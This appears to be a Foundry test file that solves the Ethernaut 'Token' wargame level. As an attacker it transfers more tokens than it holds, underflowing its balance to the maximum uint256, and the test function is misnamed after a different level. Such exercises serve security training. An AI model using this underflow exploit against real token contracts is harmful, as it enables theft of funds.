// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";
import "../src/levels/Token/Token.sol";
import "../src/levels/Token/TokenFactory.sol";

contract TokenTest is Test {
    TokenFactory public factory;
    address public instance;
    address public attacker = address(0x01);
    uint256 constant AMOUNT = 20;

    function setUp() public {
        factory = new TokenFactory();
        instance = factory.createInstance(attacker);

        assertTrue(Token(instance).balanceOf(attacker) == AMOUNT);
    }

    function testTelephoneAttack() public {
        vm.startPrank(attacker);
        Token(instance).transfer(address(0x00), AMOUNT + 1);
        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(instance), attacker));
        assertTrue(Token(instance).balanceOf(attacker) == uint256(-1));
    }
}
